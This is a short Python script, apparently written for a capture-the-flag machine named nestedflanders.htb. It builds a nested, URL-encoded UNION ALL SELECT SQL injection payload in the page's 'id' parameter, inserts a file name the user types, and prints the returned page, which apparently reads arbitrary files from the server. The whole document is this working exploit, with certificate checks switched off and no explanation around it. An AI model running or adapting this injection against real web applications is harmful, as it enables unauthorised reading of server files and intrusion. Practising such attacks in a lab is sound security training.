import bs4
import requests

file = raw_input("$ ")
payload = "25%27%20UNION%20ALL%20SELECT%20%22%27%20UNION%20ALL%20SELECT%20%27"+file+"%27%20--%20beast%22%20--%20glatisant"
req = requests.get("https://www.nestedflanders.htb/index.php?id=%s" % payload, verify=False)
res = bs4.BeautifulSoup(req.text, 'html.parser')
print res.body

